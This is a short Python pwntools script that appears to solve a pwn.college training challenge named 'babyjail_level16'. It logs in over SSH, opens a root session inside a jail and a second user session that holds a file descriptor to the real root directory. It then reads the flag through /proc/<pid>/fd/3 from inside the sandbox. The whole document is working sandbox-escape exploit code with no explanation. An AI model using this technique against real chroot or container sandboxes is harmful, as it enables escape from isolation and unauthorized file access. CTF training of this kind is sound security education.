from pwn import *
s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key")
p_root=s.process(["vm","connect"])
p_root.sendline(b"/challenge/babyjail_level16")
p_user=s.process(["vm","connect"])
sleep(1);p_root.recvuntil(b"Executing a shell inside the sandbox! Good luck!\n")
p_root.sendline(b"killall cat")
p_user.sendline(b"cat 3</") #open real / in a process
p_root.sendlineafter(b"bash-5.0#",b"cat /proc/`pgrep -f cat`/fd/3/flag")
print(p_root.recvuntil(b"}").decode())
p_user.close()
p_root.close()